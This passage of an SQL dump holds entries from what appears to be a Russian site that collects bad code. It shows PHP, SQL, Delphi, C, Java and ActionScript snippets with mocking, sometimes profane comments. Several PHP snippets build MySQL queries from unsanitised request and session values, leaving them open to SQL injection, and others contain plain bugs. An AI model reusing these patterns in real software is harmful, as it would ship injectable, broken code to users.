t.trace_line_relay_type_name\r\n                             FROM trace_line_relay_type t\r\n                            WHERE t.trace_line_relay_type_id = s.trace_line_relay_type_id) AS trace_line_relay_type_name\r\n                         ,s.object_id trace_line_id\r\n                         ,NAME(s1.exchange_id) otkuda_nax\r\n                         ,NAME(trace_line.exchange_id) kuda_blya\r\n                         ,(SELECT SUM(TO_NUMBER(n.last_number) - TO_NUMBER(n.first_number) + 1) AS s\r\n                             FROM number_interval n, region_l r\r\n                            WHERE LENGTH(r.region_add_code || n.last_number) = 10\r\n                              AND LENGTH(r.region_add_code || n.first_number) = 10\r\n                              AND n.region_id = r.object_id\r\n                              AND n.exchange_id = e.node_id) AS seven_nation_army\r\n                         ,ROWNUM\r\n                     FROM region_l r, node n, exchange_l e, node n1, service_trace_line s, trace_line, service_l s1, node n2, OBJECT o\r\n                    WHERE s.object_id = s1.object_id\r\n                      AND s1.exchange_id = e.node_id\r\n                      AND trace_line.service_id = s1.object_id\r\n                      AND e.node_id = n1.node_id\r\n                      AND n1.container_node_id = n.node_id\r\n                      AND e.exchange_class_id = 100\r\n                      AND n2.container_node_id = n.node_id\r\n                      AND n2.entity_id = 108\r\n                      AND n.region_id = r.object_id\r\n                      AND n.node_type_id = 115\r\n                      AND r.object_id = :region_key\r\n                      AND n1.node_id = o.object_id\r\n                      AND o.object_owner_type_id = 3) sel\r\n        ,(SELECT r.object_id AS region_key2\r\n                ,c.node_id AS containedcoppercross_key\r\n                ,s2.linkedobjectsinterexchange_key AS linkedobjectsinterexchange_key\r\n                ,s2.logical_cable_length AS logical_cable_length\r\n                ,s2.cable_type_name AS cable_type_name\r\n                ,NAME(sl.exchange_id) AS ATS_NAME\r\n                ,NAME(el.node_id) AS el\r\n            FROM region_l r\r\n                ,CROSS c\r\n                ,exchange_l el\r\n                ,node n2\r\n                ,service_l sl\r\n                ,trace_line tl\r\n                ,(SELECT l.node_id AS node_id\r\n                        ,l.logical_cable_id AS linkedobjectsinterexchange_key\r\n                        ,l.logical_cable_length AS logical_cable_length\r\n                        ,(SELECT c.type_name\r\n                            FROM cable_type_name c\r\n                           WHERE c.cable_type_name_id = l.cable_type_id) AS cable_type_name\r\n                    FROM logical_cable l\r\n                   WHERE l.logical_cable_type_id = 455) s2\r\n           WHERE s2.node_id(+) = c.node_id\r\n             AND c.node_id = n2.node_id\r\n             AND n2.entity_id = 108\r\n             AND c.node_id = el.cross_id\r\n             AND sl.exchange_id = el.node_id\r\n             AND tl.exchange_id = el.node_id\r\n             AND sl.entity_id = 156\r\n             AND r.object_id = :region_key) sel2\r\n   WHERE NAME(kuda_blya) = ATS_NAME\r\nGROUP BY region_key, containedobjectsbasement_key, container_node_id, containedobjectsexchange_key, number_ranges, object_name, exchange_type_name, operator_licence_number, trace_line_relay_type_name, otkuda_nax, kuda_blya, exchange_mount_capacity\r\n        ,operator_licence_number, seven_nation_army, ROWNUM, cable_type_name, logical_cable_length,ATS_NAME\r\nORDER BY otkuda_ats','','Вызывает в Oracle10g внутреннюю ошибку\r\nORA-00600: internal error code, arguments: [string], [string], [string], [string], [string], [string], [string], [string] \r\nCause: This is the generic internal error number for Oracle progra',24,0,1,3),
  (24,745,3,1227811675,0,'SELECT *\r\nFROM (SELECT n.root, n.nodeid, n.name, UNIX_TIMESTAMP(m.createtime) AS\r\n updatetime, (SELECT COUNT(*) FROM fs_node WHERE sid = n.sid AND root = n.root\r\n  AND cleft > n.cleft AND cright < n.cright AND clevel = n.clevel + 1 AND\r\n   nodetype = 1) AS objcount FROM fs_node AS n, fs_node AS m WHERE n.sid = $ sid\r\n    AND n.root IN (0, 1, 2, 3) AND n.nodetype = 0 AND m.nodeid =(SELECT MAX(\r\n    nodeid) FROM fs_node WHERE sid = n.sid AND root = n.root AND cleft > n.cleft\r\n     AND cright < n.cright AND clevel = n.clevel + 1 AND nodetype = 1) UNION ALL\r\n     SELECT n.root, NULL, NULL, UNIX_TIMESTAMP(m.createtime) AS updatetime, (\r\n     SELECT COUNT(*) FROM fs_node WHERE sid = $ sid AND root = n.root AND clevel\r\n      = 1 AND nodetype = 1) AS objcount FROM (SELECT 0 AS root UNIONSELECT 1\r\n       UNIONSELECT 2 UNIONSELECT 3) AS n, fs_node AS m WHERE m.nodeid =(SELECT\r\n        MAX(nodeid) FROM fs_node WHERE sid = $ sid AND root = n.root AND clevel\r\n         = 1 AND nodetype = 1)) AS tmp\r\nORDER BY updatetime DESC','','0',29,0,1,6),
  (25,746,1,1227812830,0,'$bCancel = false;\r\nwhile(!$bCancel)\r\n{\r\n\t$bCnt++;\r\n\t$sql = \"SELECT id, rDateTime, pDateTime, longitude, latitude, speed, reportId, inputs, peopIn, peopOut, COUNT(*) AS cnt FROM $tbname AS tblCur\r\n\t\t\tWHERE \".$repIds.\" AND pDateTime>''$fd'' AND unitId=$unitid\r\n\t\t\tGROUP BY pDateTime, reportId ORDER BY pDateTime ASC LIMIT 0, 50\";\r\n\t$request = mysql_query($sql) or die(mysql_error());\r\n\t$rCnt = 0;\r\n\twhile(!$bCancel)\r\n\t{\r\n\t\tif($row=mysql_fetch_assoc($request))\r\n\t\t{\r\n\t\t\tif(!arrZoneCoordContains($row[''longitude''],$row[''latitude''],$arrZoneCoord[$zoneId]))\r\n\t\t\t{\r\n\t\t\t\t$bCancel = true;\r\n\t\t\t}\r\n\t\t\t$fd = $row[''pDateTime''];\r\n\t   \t\tarray_push($arrRows, $row);\r\n\t\t\t$rCnt++;\r\n\t\t}\r\n\t\telseif($rCnt==0)\r\n\t\t$bCancel=true;\r\n\t}\r\n}','15, 22','O break''aх мы не знаем.',12,0,1,1),
  (26,747,1,1227819900,1229420180,'global $page_parent; //Целочисленный массив с айдями родителя страницы\r\nglobal $page_title;  //Строковый массив с названиями страниц\r\nglobal $page_dir;    //Целочисленный массив массивов списка страниц в странице (o_O)\r\nglobal $page_dirs;   //Количество страниц в странице, если 0 то страница не содержит\r\n\r\n\r\n... some code ...\r\n\r\n\r\nfunction TreeBuild($ina)\r\n{\r\n\tforeach($page_dir[$ina] as $ina)\r\n\t{\r\n\t\techo $ina.''=>''.$page_dirs[$ina].''<br>'';\r\n\t\tif($page_dirs[$ina] != 0)\r\n\t\t{\r\n\t\t\tTreeBuild($ina);\r\n\t\t}\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\nTreeBuild($i);','','Нихрена не пойме с этой рекурсией',-2,0,0,0),
  (27,748,10,1227840752,1229420180,'program Project1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\ntype\r\n  Деньга = record\r\n    Достоинство:integer;\r\n    Количество:integer;\r\n  end;\r\n\r\nvar\r\n  Лопатник: array of Деньга;\r\n\r\nprocedure ПоложитьНаЛопату(Купюра:Integer);\r\nvar\r\n  I: Integer;\r\n  УжеПоложили:Boolean;\r\nbegin\r\n  if Купюра=0 then\r\n    Exit;\r\n  УжеПоложили:=False;\r\n  for I := low(Лопатник) to High(Лопатник) do\r\n    if Лопатник[i].Достоинство=Купюра then\r\n      begin\r\n        inc(Лопатник[i].Количество);\r\n        УжеПоложили:=True;\r\n      end;\r\n  if not(УжеПоложили) then\r\n    begin\r\n      SetLength(Лопатник,Length(Лопатник)+1);\r\n      Лопатник[High(Лопатник)].Достоинство:=Купюра;\r\n      Лопатник[High(Лопатник)].Количество:=1;\r\n    end;\r\nend;\r\n\r\nvar\r\n  Купюра:integer;\r\n  i:integer;\r\n  ВсегоНаЛопате:integer;\r\nbegin\r\n  repeat\r\n    Readln(Купюра);\r\n    ПоложитьНаЛопату(Купюра);\r\n  until Купюра=0;\r\n  ВсегоНаЛопате:=0;\r\n  for I := low(Лопатник) to High(Лопатник) do\r\n    begin\r\n      WriteLn(Format(''Cost = %d Count - %d'',[Лопатник[i].Достоинство,Лопатник[i].Количество]));\r\n      inc(ВсегоНаЛопате,Лопатник[i].Достоинство*Лопатник[i].Количество);\r\n    end;\r\n  WriteLn(Format(''All money - %d'',[ВсегоНаЛопате]));\r\n  ReadLn;\r\nend.','','Вообще-то это Delphi, но его в списке не было ;)\r\nЗадача была такая:\r\nпользователь вводит достоинства купюры в произвольном порядке, ввод прекращ',-6,0,0,1),
  (28,750,7,1227852576,1229420180,'typedef struct tagRECT{\r\n    LONG    left;\r\n    LONG    top;\r\n    LONG    right;\r\n    LONG    bottom;\r\n} RECT, *PRECT, NEAR *NPRECT, FAR *LPRECT;\r\n\r\ntypedef const RECT FAR* LPCRECT;\r\n\r\ntypedef struct _RECTL{\r\n    LONG    left;\r\n    LONG    top;\r\n    LONG    right;\r\n    LONG    bottom;\r\n} RECTL, *PRECTL, *LPRECTL;\r\n\r\ntypedef const RECTL FAR* LPCRECTL;','','Вот так тайпдефятся абсолютно одинаковые структуры в windef.h',-10,0,0,1),
  (29,751,1,1227868827,0,'if ( strlen( $string ) > 3 ) echo \"Имя должно содержать не больше 3-х символов\";\r\nelseif ( strlen( $string ) < 3 ) echo \"Имя должно содержать не менее 3-х символов\";\r\nelse echo \"Вы корректно ввели имя\"','','0',91,0,1,4),
  (30,752,9,1227880470,0,'public boolean foo(...){\r\n  ...\r\n  try{\r\n  ...\r\n  }\r\n  finally{\r\n    if(expr_1){\r\n      return false;\r\n    }\r\n    if(expr_2){\r\n      return false;\r\n    }\r\n    ...\r\n    if(expr_n){\r\n      return false;\r\n    }\r\n  }\r\n  ...\r\n  return true;\r\n}','','поймал на сопровождении, долго курил (метод на 3 экранах)',20,0,1,0),
  (38,760,1,1227958028,0,'session_start();\r\nif ($_SESSION[''ok''] !== 1){\r\necho \"Сделали , блок сесиией\";\r\n$_SESSION[''ok''] = ''1'';\r\n } else {\r\necho \"Блок!\";\r\n}','2, 4','Mr_Smile: сматрите ) в первый раз на странице должна быть надпись \"Сделали блок сессией\"\r\nMr_Smile:  при последующих обновлениях надпись должн абыть \"Блок\"\r\nMr_Smile: а сколько ни обновляй все кажет \"Сделали блок сессией\"\r\nMr_Smile: я ахутнГ?\r\n\r\nhttp://www.govnokod.com/171',9,0,1,5),
  (39,762,1,1228009057,0,'echo ''когда сделают камменты?'';','','',13,0,1,22),
  (42,765,1,1228073199,1229420180,'$i = 1;\r\nwhile($i = 1){\r\necho $i;\r\n}','','',-4,0,0,0),
  (43,766,7,1228103748,1229420180,'static HRESULT SResToHRESULT(SRes res)\r\n{\r\n  switch(res)\r\n  {\r\n    case SZ_OK: return S_OK;\r\n    case SZ_ERROR_MEM: return E_OUTOFMEMORY;\r\n    case SZ_ERROR_PARAM: return E_INVALIDARG;\r\n    case SZ_ERROR_UNSUPPORTED: return E_NOTIMPL;\r\n    // case SZ_ERROR_PROGRESS: return E_ABORT;\r\n    case SZ_ERROR_DATA: return S_FALSE;\r\n  }\r\n  return E_FAIL;\r\n}','','(c) 7z',-23,0,0,3),
  (44,768,11,1228116691,0,'/**\r\n* создаем RemoteObject и регестрируем слушателей его метода sayLogin\r\n* */\r\npublic function useLogonService():void\r\n{\r\n\tlogonService = new RemoteObject();\r\n\tlogonService.destination = \"amfphp\";\r\n\tlogonService.source = \"ez_report.logon\";\r\n\tlogonService.sayLogin.addEventListener(\"result\",resultHandler);\r\n\tlogonService.addEventListener(\"fault\", faultHandler);\t\t\t\t\r\n}\r\n\t\r\n/**\r\n * после запуска модуля стартуем здесь все, что необходимо.\r\n * */\r\npublic function logonInit():void\r\n{\r\n\tuseLogonService();\r\n\tloginInput.setFocus();\r\n}\r\n\t\r\n/**\r\n * вызываем RO метод с параметрами из textinput,\r\n * который возвращает объект типа User, если регистрация прошла успешно.\r\n * */ \r\npublic function sayLogin():void\r\n{\r\n\tlogonService.sayLogin(loginInput.text,passInput.text);\t\r\n}\r\n\t\t\t\r\n//todo: ПЕРЕДЕЛАТЬ НАХЕР!!! УЁ..ИЩЕ!! все сделать через интерфейсы и события!\r\n/**\r\n * присваиваем переменным в main.swf соответствующие значения\r\n * */ \r\nprivate function resultHandler(rs:ResultEvent):void\r\n{\r\n\tparentApplication.login=loginInput.text;\r\n\tparentApplication.password=passInput.text;\r\n\tparentApplication.removeLogonModule();\r\n}\t\t\t\r\n\r\n//todo: прикрутить, наконец, проверку типа ошибки.\t\t\t\r\nprivate function faultHandler(f:FaultEvent):void\r\n{\r\n\tAlert.show(f.fault.faultString+f.fault.faultDetail+f.message.body.toString());\r\n}','','Crazy horse\r\nКогда-то мной писалось и такое)) \r\nкошмар, конечно, но все на чем-то учатся.\r\nТеперь особо радуют комментарии (AsDoc, как же,)\r\nсвязь с parentApplication и отсутствие прокси.',4,0,1,0),
  (46,770,6,1228157827,1229420180,'void\r\ntimerfunc(int sig)\r\n{\r\n  signal(SIGALRM, timerfunc);\r\n  TimerCount++;\r\n  TimerCallFunc();\r\n}','','найдено в \"примере\"',-2,0,0,1),
  (47,771,7,1228163027,1229420180,'QString newText=text;               \r\nif (weShouldIgnoreSpaces())         \r\n        newText.replace(QString(\" \"),QString(\"%\"));\r\ndelete modelAnswer;                                                                                     \r\ndelete modelQuestion;                                                                                   \r\nmodelAnswer = new QSqlQueryModel(0);                                                                    \r\nmodelQuestion = new QSqlQueryModel(0);                                                                  \r\nquestionOutput->setModel(modelQuestion);                                                                \r\nanswerOutput->setModel(modelAnswer);','','Кусочек кода на C++/Qt, чтобы SQLite успевал закончить обработку прошлого запроса перед новым. Как ни странно помогало...',-4,0,0,0),
  (48,772,9,1228204452,0,'public static Date createDate(Integer iYear, Integer iMonth, Integer iDay) throws Exception\r\n    {\r\n        if ((!(iYear instanceof Integer))\r\n                || (!(iMonth instanceof Integer))\r\n                || (!(iDay instanceof Integer))\r\n                )\r\n        {\r\n            throw new Exception();\r\n        }\r\n\r\n        Date date = null;\r\n        String year, month, day;\r\n\r\n        year = iYear.toString();\r\n        month = iMonth.toString();\r\n        day = iDay.toString();\r\n        try\r\n        {\r\n            date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(year + \"/\" + month + \"/\" + day);\r\n\r\n        } catch (ParseException e)\r\n        {\r\n            log.warn(\"Date transformation failed for year, month, day:  \" + iYear + \", \" + iMonth + \", \" + iDay);\r\n        }\r\n        return date;\r\n    }','','Индусы Рулят!!!',40,0,1,12),
  (49,773,7,1228213120,1230054919,'void ListViewCtrl::SetEditableColumn(int col, bool editable)\r\n{\r\n\twhile(col >= static_cast<int>(editableCols_.size()))\r\n\t{\r\n\t\teditableCols_.push_back(true);\r\n\t}\r\n    editableCols_[col] = editable;\r\n}','','std::vector<bool> editableCols_;\r\nвектор булов используется в ListView для того чтобы указать является ли столбец редактируемым... \r\n\r\np.s. польские паттерны)',-1,0,0,1),
  (50,774,6,1228244723,0,'void DictionaryEnumeratorFunction(char *val, void *tag)\r\n{\r\n\tDictionaryEnumeratorData ***data;\r\n\tdata = (DictionaryEnumeratorData***) tag;\r\n\r\n\t(**data) = malloc(sizeof(DictionaryEnumeratorData));\r\n\t(**data)->val = malloc(0); /* O_o [комент добавлен много позднее] */\r\n\tstrcpy((**data)->val, val);\r\n\t(**data)->next = NULL;\r\n\t*data = &((**data)->next);\r\n}','','Код, забивающий в массив данные из словаря (ассоциативного массива), путём рекурсивного обхода и вызова ЭТОГО. Писалось в 3 часа ночи.\r\nНа утро тихо матерился и переписывал всё',34,0,1,0),
  (53,882,1,1228389459,0,'str_replace(\"\\t\", \"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\", $file_new);','','4страйко)',2,0,1,1),
  (54,884,10,1228389923,0,'function IntToMonth(NumberMonth: Integer): string;\r\nbegin\r\n  сase NumberMonth of\r\n    1: Result := ''Январь'';\r\n    2: Result := ''Февраль'';\r\n    3: Result := ''Март'';\r\n    4: Result := ''Апрель'';\r\n    5: Result := ''Май'';\r\n    6: Result := ''Июнь'';\r\n    7: Result := ''Июль'';\r\n    8: Result := ''Август'';\r\n    9: Result := ''Сентябрь'';\r\n    10: Result := ''Октябрь'';\r\n    11: Result := ''Ноябрь'';\r\n    12: Result := ''Декабрь'';\r\n  else\r\n    Result := ''Август'';\r\n  end;\r\nend;','','Думаю, по названию функции все понятно :)',32,0,1,13),
  (55,887,4,1228392904,0,'#!/usr/blin/perl','','',144,0,1,11),
  (56,889,7,1228396330,0,'if (result == true)\r\n  return true;\r\nelse\r\n return result;','','этпипец... из разряда индокода, только в реале',87,0,1,1),
  (57,893,9,1228398175,1229420180,'/**\r\n  * Getter for billbackAdjustmentType \r\n  *\r\n  * @return the billbackAdjustmentType instance\r\n  */\r\npublic BillbackAdjustmentType getBillbackAdjustmentType() {\r\n    return billbackAdjustmentType != null ? billbackAdjustmentType : BillbackAdjustmentType.PlusBillbackAdjustment;\r\n}','','...и попробуй такое найди под дебагом :)',-8,0,0,3),
  (58,896,11,1228399603,0,'function isAvailable():Boolean{\r\n    return ExternalInterface.available;\r\n}\r\nExternalInterface.addCallback(''isAvailable'', isAvailable);','','это примерно как в ХТМЛ \r\nalert(\"ваш браузер не поддерживает яваскрипт\")',12,0,1,4),
  (60,902,4,1228400590,0,'###\r\n### ввод цен на открытки\r\n###\r\n\r\nif ($p{card}==0) {$o=0}\r\nif ($p{card}==1) {$o=20}\r\nif ($p{card}==2) {$o=20}\r\nif ($p{card}==3) {$o=20}\r\nif ($p{card}==4) {$o=20}\r\nif ($p{card}==5) {$o=20}\r\nif ($p{card}==6) {$o=20}\r\nif ($p{card}==7) {$o=20}\r\nif ($p{card}==8) {$o=20}\r\nif ($p{card}==9) {$o=20}\r\nif ($p{card}==10) {$o=20}\r\nif ($p{card}==11) {$o=20}\r\nif ($p{card}==12) {$o=20}\r\nif ($p{card}==13) {$o=20}\r\nif ($p{card}==14) {$o=20}\r\nif ($p{card}==15) {$o=20}\r\nif ($p{card}==16) {$o=20}\r\nif ($p{card}==17) {$o=20}\r\nif ($p{card}==18) {$o=20}','','',24,0,1,1),
  (61,916,8,1228436736,0,'bool value;\r\nif(value.ToString.Length() == 4)\r\n  return true;\r\nelse if(value.ToString.Length() == 5)\r\n  return false;\r\n\r\nelse\r\n  return !true && !false;','','Проверка условия',30,0,1,10),
  (62,920,6,1228467084,0,'define true false; //удачной отладки!','','боянистый боян',7,0,1,7),
  (63,939,1,1228535953,0,'$id = 0;\r\nwhile (!$id || mysql_error()) {\r\n    $id = rand(1, 10000000);\r\n    mysql_query(\"INSERT INTO `table` (id) VALUES (''\".$id.\"''\");\r\n}','','',19,0,1,2),
  (65,956,6,1228674867,1229420180,'@interface GUIColor\r\n{\r\n  int palete,color;\r\n}\r\n\r\n+ (GUIColor *) initColor: (int) palete: (int) r:(int) g:(int) b;\r\n- free;\r\n\r\n- (int) getPalete;\r\n- (int) get','','на самом деле Objective-C добавьте в список\r\nначал писать класс,потом задумался что же я делаю',-6,0,0,1),
  (66,959,1,1228679759,0,'function PagerStarter( $object_id, $object_url, $dbt, $maxwidth, $edittime, $level_step, $comments_per_page )\r\n{\r\n\tif ( $_GET[''from''] ) { $from = $_GET[''from'']; }\r\n\tif ( $_POST[''from''] ) { $from = $_POST[''from'']; }\r\n\tif ( $_GET[''current_page''] ) { $current_page = $_GET[''current_page'']; }\r\n\tif ( $_POST[''current_page''] ) { $current_page = $_POST[''current_page'']; }\r\n\tif ( ( empty( $current_page ) == TRUE ) && ( empty( $from ) == TRUE ) )\r\n\t\t{\r\n\t\t$r = mysql_query( \"SELECT * FROM \".$dbt.\" WHERE parent = ''1'' AND parent_image = ''$object_id''\".$e.\"\" );\r\n\t\t$r_count = mysql_num_rows ( $r );\r\n\t\t$total_pages = 0;\r\n\t\t$i = 0;\r\n\t\twhile ( $i < $r_count )\r\n\t\t\t{\r\n\t\t\t$total_pages = $total_pages + 1;\r\n\t\t\t$i = $i + $comments_per_page;\r\n\t\t\t}\r\n\t\tif ( $total_pages == 0 )\r\n\t\t\t{\r\n\t\t\t$total_pages = 1;\r\n\t\t\t}\r\n\t\tfor ( $i = 1 ; $i <= $total_pages ; $i++ )\r\n\t\t\t{\r\n\t\t\t$from_q = ( $i * $comments_per_page ) - $comments_per_page + 0;\r\n\t\t\t}\r\n\t\t$_GET[''current_page''] = $total_pages;\r\n\t\t$_GET[''from''] = $from_q;\r\n\t\t}\r\n}','','Особого внимания заслуживает деление сложением. Хотя тут еще достаточно говна :)',29,0,1,6),
  (67,965,1,1228684332,0,'$find = str_replace(\",\", \"\", $find);\r\n$find = str_replace(\".\", \"\", $find);\r\n$find = str_replace(\"/\", \"\", $find);\r\n$find = str_replace(\" \", \"\", $find);\r\n$find = str_replace(\"-\", \"\", $find);\r\n$find = str_replace(\"+\", \"\", $find);\r\n$find = str_replace(\"#\", \"\", $find);','','Регулярные выражения =)',31,0,1,14),
  (68,978,1,1228732818,0,'$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `Title` = ''\".$Title.\"''\");\r\n$row = mysql_fetch_assoc($result);\r\n$wID=$row[''ID''];\r\n$Wallpaper1=$row[''Wallpaper1''];\r\n$Wallpaper2=$row[''Wallpaper2''];\r\n$Wallpaper3=$row[''Wallpaper3''];\r\n$Wallpaper4=$row[''Wallpaper4''];\r\n$Wallpaper5=$row[''Wallpaper5''];\r\n\r\nif ( $_SESSION[''userid''] )\r\n\t{ \r\n\tif ($Wallpaper1 != NULL) {\r\n\t\t$size='''';\r\n\t\t$size=getimagesize(\"images/wallpapers/\".$Wallpaper1);\r\n\t\t$dHTML .= ''<a class=\"preview\" href=\"''.$image_path.''show/''.$Title.''/?w=1\" style=\"text-decoration: underline;\" onClick=\"alerts(''.$wID.''); countIp();\">''.$size[0].''x''.$size[1].''</a> '';\r\n\t}\r\n\tif ($Wallpaper2 != NULL) {\r\n\t\t$size='''';\r\n\t\t$size=getimagesize(\"images/wallpapers/\".$Wallpaper2);\r\n\t\t$dHTML .= ''<a class=\"preview\" href=\"''.$image_path.''show/''.$Title.''/?w=2\" style=\"text-decoration: underline;\" onClick=\"alerts(''.$wID.''); countIp();\">''.$size[0].''x''.$size[1].''</a> '';\r\n\t}\r\n\tif ($Wallpaper3 != NULL) {\r\n\t\t$size='''';\r\n\t\t$size=getimagesize(\"images/wallpapers/\".$Wallpaper3);\r\n\t\t$dHTML .= ''<a class=\"preview\" href=\"''.$image_path.''show/''.$Title.''/?w=3\" style=\"text-decoration: underline;\" onClick=\"alerts(''.$wID.''); countIp();\">''.$size[0].''x''.$size[1].''</a> '';\r\n\t}\r\n\tif ($Wallpaper4 != NULL) {\r\n\t\t$size='''';\r\n\t\t$size=getimagesize(\"images/wallpapers/\".$Wallpaper4);\r\n\t\t$dHTML .= ''<a class=\"preview\" href=\"''.$image_path.''show/''.$Title.''/?w=4\" style=\"text-decoration: underline;\" onClick=\"alerts(''.$wID.''); countIp();\">''.$size[0].''x''.$size[1].''</a> '';\r\n\t}\r\n\tif ($Wallpaper5 != NULL) {\r\n\t\t$size='''';\r\n\t\t$size=getimagesize(\"images/wallpapers/\".$Wallpaper5);\r\n\t\t$dHTML .= ''<a class=\"preview\" href=\"''.$image_path.''show/''.$Title.''/?w=5\" style=\"text-decoration: underline;\" onClick=\"alerts(''.$wID.''); countIp();\">''.$size[0].''x''.$size[1].''</a> '';\r\n\t}\r\n\t}','','',8,0,1,0),
  (69,980,1,1228734101,0,'$cResult = mysql_query($cQuery) or die(mysql_error());\r\nif (mysql_num_rows($cResult) <= 0)\r\n{\r\n\tif ( $_GET[''extra''] == \"a\" || $_GET[''extra''] == 4 || $_GET[''extra''] == 16 || $_GET[''extra''] == \"n\" || $_GET[''extra''] == \"m\" || $_GET[''extra''] == \"m_in_cat\" )\r\n\t\t{}\r\n\telse\r\n\t\t{\r\n\t\techo CAT_NO_WALP;\r\n\t\t}\r\n} else\r\n{\r\n\t$Row = mysql_fetch_object($cResult);\r\n\t$id = $Row->id;\r\n\r\n\tif ( $_GET[''extra''] == \"a\" )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == 4 )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `four_three` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `four_three` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `four_three` = ''1'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == 16 )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `sixteen_ten` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `sixteen_ten` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `sixteen_ten` = ''1'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == \"n\" )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `status_NEW` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `status_NEW` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `status_NEW` = ''1'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == \"m\" )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `poster` = ''\".$_SESSION[''userid''].\"'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `poster` = ''\".$_SESSION[''userid''].\"'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `poster` = ''\".$_SESSION[''userid''].\"'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == \"m_in_cat\" )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `poster` = ''\".$_SESSION[''userid''].\"'' AND Category = ''\".$result_needed[''id''].\"'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `poster` = ''\".$_SESSION[''userid''].\"'' AND Category = ''\".$result_needed[''id''].\"'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `poster` = ''\".$_SESSION[''userid''].\"'' AND Category = ''\".$result_needed[''id''].\"'' ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telse\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `Category` = ''\".$id.\"'' OR `Category` IN (SELECT `id` FROM `Categories` WHERE `Parent` = ''\".$id.\"'') ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");   ///-------------\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `Category` = ''\".$id.\"'' OR `Category` IN (SELECT `id` FROM `Categories` WHERE `Parent` = ''\".$id.\"'') ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `approved` = ''0'' AND `Category` = ''\".$id.\"'' OR `Category` IN (SELECT `id` FROM `Categories` WHERE `Parent` = ''\".$id.\"'') ORDER BY `ID` DESC\");\r\n\t\t}\r\n\r\n\tif ( $_GET[''extra''] == \"a\" && $_SESSION[''usergroupid''] > 3 )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$countresult = mysql_query(\"SELECT * FROM `Wallpapers` ORDER BY `ID` DESC\");\r\n\t\t}\r\n\telseif ( $_GET[''extra''] == 4 && $_SESSION[''usergroupid''] > 3 )\r\n\t\t{\r\n\t\t$result = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `four_three` = ''1'' ORDER BY `ID` DESC LIMIT \".$page*$picsperpage.\",$picsperpage\");\r\n\t\t$myresult = mysql_query(\"SELECT * FROM `Wallpapers` WHERE `four_three` = ''1'' ORDER BY 